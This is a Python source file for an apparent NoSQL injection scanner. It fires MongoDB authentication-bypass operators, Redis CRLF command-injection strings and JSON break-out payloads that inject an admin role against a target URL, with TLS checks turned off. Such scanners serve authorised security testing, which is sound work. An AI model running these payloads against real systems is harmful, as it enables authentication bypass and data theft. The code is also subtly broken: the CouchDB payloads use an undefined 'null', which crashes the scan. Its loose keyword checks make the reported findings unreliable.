"""
NoSQL Injection Scanner
Detects injection vulnerabilities in NoSQL databases (MongoDB, Redis, CouchDB, etc.)
"""

import asyncio
import aiohttp
import json
import logging
from typing import List, Dict, Optional
from datetime import datetime
from urllib.parse import urlencode, quote

logger = logging.getLogger(__name__)


class NoSQLScanner:
    """Scanner for NoSQL injection vulnerabilities."""

    def __init__(self, config: Dict):
        self.config = config

    async def scan(self, url: str, parameters: Dict[str, str]) -> List[Dict]:
        """
        Comprehensive NoSQL injection scan.

        Tests for:
        - MongoDB injection
        - Redis command injection
        - CouchDB injection
        - Cassandra injection
        """
        vulnerabilities = []

        logger.info(f"Starting NoSQL injection scan on {url}")

        for param_name, param_value in parameters.items():
            # Test MongoDB injection
            mongo_vulns = await self._test_mongodb_injection(url, param_name, parameters.copy())
            vulnerabilities.extend(mongo_vulns)

            # Test Redis injection
            redis_vulns = await self._test_redis_injection(url, param_name, parameters.copy())
            vulnerabilities.extend(redis_vulns)

            # Test CouchDB injection
            couch_vulns = await self._test_couchdb_injection(url, param_name, parameters.copy())
            vulnerabilities.extend(couch_vulns)

            # Test JSON injection
            json_vulns = await self._test_json_injection(url, param_name, parameters.copy())
            vulnerabilities.extend(json_vulns)

        logger.info(f"NoSQL scan complete: {len(vulnerabilities)} vulnerabilities found")
        return vulnerabilities

    async def _test_mongodb_injection(self, url: str, param_name: str, params: Dict) -> List[Dict]:
        """Test for MongoDB injection vulnerabilities."""
        vulnerabilities = []

        # MongoDB operators that can be injected
        mongo_payloads = [
            # Authentication bypass
            {"$ne": None},
            {"$ne": ""},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$exists": True},
            {"$where": "1==1"},
            {"$or": [{"a": 1}, {"b": 1}]},

            # String payloads
            '{"$ne": null}',
            '{"$ne": ""}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "return true"}',

            # Authentication bypass attempts
            {'$ne': 1},
            {'$gt': ''},
            {'$gte': ''},
            {'$lt': ''},
            {'$lte': ''},
            {'$in': ['admin', 'user']},
            {'$nin': ['']}
        ]

        for payload in mongo_payloads:
            vuln = await self._test_nosql_payload(
                url,
                param_name,
                payload,
                params.copy(),
                "MongoDB"
            )
            if vuln:
                vulnerabilities.append(vuln)
                break  # Found one, move to next parameter

        # Test URL-encoded MongoDB operators
        url_encoded_payloads = [
            f'{param_name}[$ne]=1',
            f'{param_name}[$gt]=',
            f'{param_name}[$regex]=.*',
            f'{param_name}[$where]=1==1'
        ]

        for encoded_payload in url_encoded_payloads:
            vuln = await self._test_url_encoded_nosql(
                url,
                encoded_payload,
                "MongoDB"
            )
            if vuln:
                vulnerabilities.append(vuln)
                break

        return vulnerabilities

    async def _test_redis_injection(self, url: str, param_name: str, params: Dict) -> List[Dict]:
        """Test for Redis command injection."""
        vulnerabilities = []

        # Redis command injection payloads
        redis_payloads = [
            "\r\n*1\r\n$4\r\nKEYS\r\n$1\r\n*\r\n",  # KEYS *
            "\r\n*1\r\n$4\r\nINFO\r\n",  # INFO
            "\r\n*1\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$1\r\n*\r\n",  # CONFIG GET *
            "\n\n*1\r\n$4\r\nQUIT\r\n",  # QUIT
            "\r\n SET test test\r\n",  # SET command
            "\r\n GET test\r\n",  # GET command
        ]

        for payload in redis_payloads:
            params[param_name] = payload

            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        url,
                        params=params,
                        timeout=aiohttp.ClientTimeout(total=10),
                        ssl=False
                    ) as response:
                        text = await response.text()

                        # Check for Redis responses
                        redis_indicators = [
                            'redis_version',
                            'used_memory',
                            'connected_clients',
                            '+OK',
                            '+PONG',
                            '$-1',  # Redis NIL
                            '*0'  # Empty array
                        ]

                        if any(indicator in text for indicator in redis_indicators):
                            vulnerabilities.append({
                                'name': f'Redis Command Injection in {param_name}',
                                'severity': 'critical',
                                'category': 'nosql_injection',
                                'url': url,
                                'description': f'The parameter "{param_name}" is vulnerable to Redis command injection. '
                                              f'An attacker can execute arbitrary Redis commands, potentially reading '
                                              f'sensitive data or modifying the database.',
                                'proof_of_concept': f'{url}?{urlencode(params)}',
                                'remediation': 'Never pass user input directly to Redis commands. Use parameterized '
                                             'queries or ORM/ODM. Validate and sanitize all input. Run Redis with '
                                             'authentication and limited commands.',
                                'discovered_at': datetime.now().isoformat()
                            })
                            break

            except Exception as e:
                logger.debug(f"Redis injection test error: {e}")

        return vulnerabilities

    async def _test_couchdb_injection(self, url: str, param_name: str, params: Dict) -> List[Dict]:
        """Test for CouchDB injection."""
        vulnerabilities = []

        # CouchDB Mango query injection
        couch_payloads = [
            {"$or": [{"_id": {"$gt": null}}]},
            {"selector": {"$or": [{"_id": {"$gt": null}}]}},
            {"_id": {"$regex": ".*"}},
        ]

        for payload in couch_payloads:
            vuln = await self._test_nosql_payload(
                url,
                param_name,
                payload,
                params.copy(),
                "CouchDB"
            )
            if vuln:
                vulnerabilities.append(vuln)
                break

        return vulnerabilities

    async def _test_json_injection(self, url: str, param_name: str, params: Dict) -> List[Dict]:
        """Test for JSON parameter injection in NoSQL queries."""
        vulnerabilities = []

        # Try to break out of JSON context
        json_payloads = [
            '", "password": {"$ne": null}, "x": "x',
            '", "role": "admin", "x": "x',
            '"}}, {"$or": [{"a": 1}, {"b": 1}]}, {"x": {"y": "y',
        ]

        for payload in json_payloads:
            params[param_name] = payload

            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        url,
                        params=params,
                        timeout=aiohttp.ClientTimeout(total=10),
                        ssl=False
                    ) as response:
                        # Check if successful response (might indicate injection worked)
                        if response.status == 200:
                            text = await response.text()

                            # Look for signs of successful injection
                            success_indicators = [
                                '"admin"',
                                '"role":"admin"',
                                'welcome',
                                'dashboard',
                                'authenticated'
                            ]

                            if any(indicator in text.lower() for indicator in success_indicators):
                                vulnerabilities.append({
                                    'name': f'NoSQL JSON Injection in {param_name}',
                                    'severity': 'high',
                                    'category': 'nosql_injection',
                                    'url': url,
                                    'description': f'The parameter "{param_name}" is vulnerable to NoSQL injection via '
                                                  f'JSON parameter manipulation. User input is being incorporated into '
                                                  f'NoSQL queries without proper sanitization.',
                                    'proof_of_concept': f'{url}?{urlencode(params)}',
                                    'remediation': 'Use parameterized queries or ORM/ODM. Validate and sanitize all input. '
                                                 'Never construct queries by concatenating user input.',
                                    'discovered_at': datetime.now().isoformat()
                                })
                                break

            except Exception as e:
                logger.debug(f"JSON injection test error: {e}")

        return vulnerabilities

    async def _test_nosql_payload(self, url: str, param_name: str, payload: any, params: Dict, db_type: str) -> Optional[Dict]:
        """Test a specific NoSQL payload."""
        try:
            # Test as JSON POST
            json_payload = params.copy()
            json_payload[param_name] = payload

            async with aiohttp.ClientSession() as session:
                # Test POST request with JSON
                async with session.post(
                    url,
                    json=json_payload,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    if response.status == 200:
                        text = await response.text()

                        # Check for signs of successful injection
                        success_indicators = [
                            'true',
                            'success',
                            'authenticated',
                            'welcome',
                            'token',
                            'session',
                            '"admin"',
                            '"user":'
                        ]

                        # Check if response is significantly different (might indicate injection)
                        if any(indicator in text.lower() for indicator in success_indicators):
                            return {
                                'name': f'{db_type} Injection in {param_name}',
                                'severity': 'critical',
                                'category': 'nosql_injection',
                                'url': url,
                                'description': f'The parameter "{param_name}" is vulnerable to {db_type} injection. '
                                              f'An attacker can manipulate NoSQL queries to bypass authentication, '
                                              f'extract data, or modify database contents.',
                                'proof_of_concept': json.dumps(json_payload, indent=2),
                                'remediation': f'Use parameterized queries or ORM/ODM for {db_type}. '
                                             f'Validate and sanitize all user input. Never construct queries by '
                                             f'concatenating user input. Implement proper input type checking.',
                                'discovered_at': datetime.now().isoformat()
                            }

                # Also test GET request with URL encoding
                if isinstance(payload, dict):
                    params[param_name] = json.dumps(payload)
                else:
                    params[param_name] = str(payload)

                async with session.get(
                    url,
                    params=params,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    if response.status == 200:
                        text = await response.text()

                        if any(indicator in text.lower() for indicator in success_indicators):
                            return {
                                'name': f'{db_type} Injection in {param_name} (GET)',
                                'severity': 'critical',
                                'category': 'nosql_injection',
                                'url': url,
                                'description': f'The parameter "{param_name}" is vulnerable to {db_type} injection via GET request.',
                                'proof_of_concept': f'{url}?{urlencode(params)}',
                                'remediation': f'Use parameterized queries for {db_type}. Validate input.',
                                'discovered_at': datetime.now().isoformat()
                            }

        except Exception as e:
            logger.debug(f"NoSQL payload test error: {e}")

        return None

    async def _test_url_encoded_nosql(self, url: str, encoded_payload: str, db_type: str) -> Optional[Dict]:
        """Test URL-encoded NoSQL injection."""
        try:
            test_url = f"{url}?{encoded_payload}"

            async with aiohttp.ClientSession() as session:
                async with session.get(
                    test_url,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    if response.status == 200:
                        text = await response.text()

                        # Check for successful injection indicators
                        if any(indicator in text.lower() for indicator in ['true', 'success', 'authenticated', 'admin']):
                            param_name = encoded_payload.split('[')[0] if '[' in encoded_payload else 'unknown'

                            return {
                                'name': f'{db_type} Injection via URL Encoding in {param_name}',
                                'severity': 'critical',
                                'category': 'nosql_injection',
                                'url': url,
                                'description': f'The application is vulnerable to {db_type} injection via URL-encoded operators. '
                                              f'Attacker can inject database operators to bypass authentication or extract data.',
                                'proof_of_concept': test_url,
                                'remediation': f'Properly validate and sanitize URL parameters before using in {db_type} queries. '
                                             f'Block or escape NoSQL operators in user input.',
                                'discovered_at': datetime.now().isoformat()
                            }

        except Exception as e:
            logger.debug(f"URL-encoded NoSQL test error: {e}")

        return None


async def scan_nosql_injection(url: str, parameters: Dict[str, str], config: Dict) -> List[Dict]:
    """Convenience function to scan for NoSQL injection."""
    scanner = NoSQLScanner(config)
    return await scanner.scan(url, parameters)
